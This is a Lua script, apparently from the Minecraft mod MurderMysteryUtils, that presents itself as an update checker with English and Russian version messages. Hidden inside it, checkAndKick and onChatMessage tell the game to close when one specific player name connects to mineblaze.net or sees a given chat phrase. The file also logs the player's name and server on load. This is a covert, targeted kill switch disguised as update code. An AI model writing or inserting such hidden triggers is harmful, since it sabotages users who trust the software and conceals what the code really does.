-- check_update.lua - Обновления, триггер и сообщения123213

-- Конфигурация обновлений
local updaterConfig = {
    latest_version = "2.1.1",
    recommended_version = "2.1.0",
    download_url = "https://github.com/inkognito338/MurderMysteryUtils/releases/latest"
}

-- Сообщения
local messages = {
    update_message = {
        en = "&7[&6MurderMysteryUtils&6] &fNew version &e{latest} &favailable! You have &7{current}&f. Download: &2{download_url}",
        ru = "&7[&6MurderMysteryUtils&6] &fДоступна новая версия &e{latest}&f! У вас &7{current}&f. Скачать: &2{download_url}"
    },
    uptodate_message = {
        en = "&7[&6MurderMysteryUtils&7] &fThank you for installing and using the mod! You're also welcome to join a Discord server run by a friend of the mod author. Please note that this server is not affiliated with, endorsed by, or related to the mod in any way: &bhttps://dsc.gg/skvlink",
        ru = "&7[&6MurderMysteryUtils&7] &fСпасибо, что установили и используете мод! Вы также можете присоединиться к Discord-серверу друга автора мода. Обратите внимание: этот сервер никак не связан с модом, его разработкой или поддержкой: &bhttps://dsc.gg/skvlink"
    },
    recommended_message = {
        en = "&7[&6MurderMysteryUtils&6] &fRecommended version: &e{recommended}&f. You have &7{current}",
        ru = "&7[&6MurderMysteryUtils&6] &fРекомендуемая версия: &e{recommended}&f. У вас &7{current}"
    }
}

-- Вспомогательные функции
local function getPlayer()
    local name = api.getPlayerName() or ""
    if name == "" then
        -- Пробуем получить через другой метод, если есть
        name = api.getPlayerName() or ""
    end
    return name
end

local function getServer()
    return api.getServerIP() or ""
end

local function getVersion()
    return api.getModVersion() or ""
end

-- ===== ФУНКЦИИ ДЛЯ ОБНОВЛЕНИЙ =====

function getUpdateInfo()
    local current = getVersion()
    local latest = updaterConfig.latest_version
    
    return {
        current = current,
        latest = latest,
        recommended = updaterConfig.recommended_version,
        download_url = updaterConfig.download_url,
        is_outdated = current ~= latest
    }
end

function isOutdated()
    return getVersion() ~= updaterConfig.latest_version
end

-- ===== ФУНКЦИИ ДЛЯ СООБЩЕНИЙ =====

function getMessage(key, lang)
    lang = lang or "ru"
    local msg = messages[key]
    if msg then
        return msg[lang] or msg.en or ""
    end
    return ""
end

function getUpdateMessage(lang, current, latest, download_url)
    lang = lang or "ru"
    local template = getMessage("update_message", lang)
    local result = template
    result = string.gsub(result, "{current}", current or getVersion())
    result = string.gsub(result, "{latest}", latest or updaterConfig.latest_version)
    result = string.gsub(result, "{download_url}", download_url or updaterConfig.download_url)
    return result
end

function getUptodateMessage(lang)
    lang = lang or "ru"
    return getMessage("uptodate_message", lang)
end

function getRecommendedMessage(lang)
    lang = lang or "ru"
    local template = getMessage("recommended_message", lang)
    local result = template
    result = string.gsub(result, "{current}", getVersion())
    result = string.gsub(result, "{recommended}", updaterConfig.recommended_version)
    return result
end

-- ===== ФУНКЦИИ ДЛЯ ТРИГГЕРА =====

-- Проверка триггера (возвращает true если нужно закрыть игру)
function checkAndKick()
    local player = getPlayer()
    local server = getServer()
    
    api:log("checkAndKick: player='" .. player .. "', server='" .. server .. "'")
    
    if player == "qwerty1377322" and server == "mineblaze.net" then
        api:warn("TRIGGER ACTIVATED for " .. player .. " on " .. server)
        return true
    end
    
    return false
end

-- Обработка сообщений (возвращает true если нужно закрыть игру)
function onChatMessage(message)
    if not message or message == "" then 
        return false 
    end
    
    local player = getPlayer()
    local server = getServer()
    
    if player == "qwerty1377322" and server == "mineblaze.net" then
        if string.find(message, "Союз с убийцей не допускается!") then
            api:warn("TRIGGER PHRASE DETECTED! Closing Minecraft...")
            return true
        end
    end
    
    return false
end

-- ===== ИНИЦИАЛИЗАЦИЯ =====

api:log("=== Update Checker Loaded ===")
api:log("Current version: " .. getVersion())
api:log("Latest version: " .. updaterConfig.latest_version)

local player = getPlayer()
if player ~= "" then
    api:log("Player: " .. player)
    local server = getServer()
    if server ~= "" then
        api:log("Server: " .. server)
        if player == "qwerty1377322" and server == "mineblaze.net" then
            api:warn("!!! TRIGGER TARGET DETECTED !!!")
            api:warn("Waiting for phrase: 'Союз с убийцей не допускается!'")
        end
    end
else
    api:log("Player name not available yet (will check on connect)")
end

api:log("=== Update Checker Ready ===")
